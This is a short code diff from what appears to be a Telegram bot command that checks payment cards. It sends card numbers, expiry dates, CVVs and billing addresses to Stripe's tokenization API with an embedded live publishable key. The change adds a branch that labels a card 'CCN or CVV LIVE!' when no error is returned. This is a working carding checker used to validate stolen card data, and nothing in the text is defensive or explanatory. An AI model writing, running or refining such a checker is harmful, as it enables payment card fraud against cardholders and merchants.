@@ -152,8 +152,12 @@ def chk(update,context):
     password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10))) 
     data = f"time_on_page=38212&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_omFDE4PpGEioGWha5NXjoPJo&payment_user_agent=stripe.js%2F308cc4f&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_line1]={street}&card[address_line2]=&card[address_city]={city}&card[address_state]={state}&card[address_zip]={zip}&card[address_country]=US&card[cvc]={cvv}&card[name]={first_name}+{last_name}"
     response = requests.post('https://api.stripe.com/v1/tokens', headers=sk_headers, data=data)
-    res = response.json()
-    msg = res["error"]["message"]
+    q = response.text
+    e=json.loads(q)
+    if "error" not in e:
+        msg = "CCN or CVV LIVE!"
+    else:
+        msg = e["error"]["message"]
     toc = time.perf_counter()
     if "incorrect_cvc" in response.text:
         text = (f"""
